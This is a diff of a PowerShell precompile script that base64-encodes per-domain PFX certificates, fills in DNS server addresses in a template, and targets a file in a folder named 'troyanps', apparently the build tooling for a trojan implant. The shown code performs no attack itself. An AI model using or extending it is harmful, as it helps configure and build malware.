@@ -1,15 +1,5 @@
-#init
+. .\current.ps1
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-$commonPath = Join-Path -Path $scriptDir -ChildPath "..\common.ps1"
-$commonOutput = & $commonPath
-$domainArray = $commonOutput.domainArray
-$publicInterface = $commonOutput.publicInterface
-$secondInterface = $commonOutput.secondInterface
-$valid = $commonOutput.valid;
-if (-not $valid) {
-    Write-Host "Exiting precompile.ps1 script with an error." -ForegroundColor Red
-    throw "An error occurred."
-}
 
 #certs
 $template = @"
@@ -20,11 +10,14 @@ $template = @"
 }
 "@
 $stringList = @()
-foreach ($domain in $domainArray) {
+foreach ($domain in $server.domains) {
     if (-not [string]::IsNullOrWhiteSpace($domain)) 
     {
-        $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\cert\$domain.pfx"
+        $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\..\cert\$domain.pfx"
         $pathPfx = (Resolve-Path -Path $pathPfx).Path
+        if ([string]::IsNullOrEmpty($pathPfx)) {
+            throw "The certficiate is not found for domain: $domain"
+        }
         $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
         $base64 = [Convert]::ToBase64String($binaryData)
         $chunkSize = 200
@@ -38,8 +31,8 @@ foreach ($domain in $domainArray) {
     }
 }
 $listString = $stringList -join [System.Environment]::NewLine
-$template = $template -replace "1\.1\.1\.1", $publicInterface
-$template = $template -replace "2\.2\.2\.2", $secondInterface
+$template = $template -replace "1\.1\.1\.1", $server.primaryDns
+$template = $template -replace "2\.2\.2\.2", $server.secondaryDns
 $template  = $template -replace "JOPA", $listString
 $troyan = Join-Path -Path $scriptDir -ChildPath '..\troyanps\consts.ps1'
 $troyan = (Resolve-Path -Path $troyan).Path
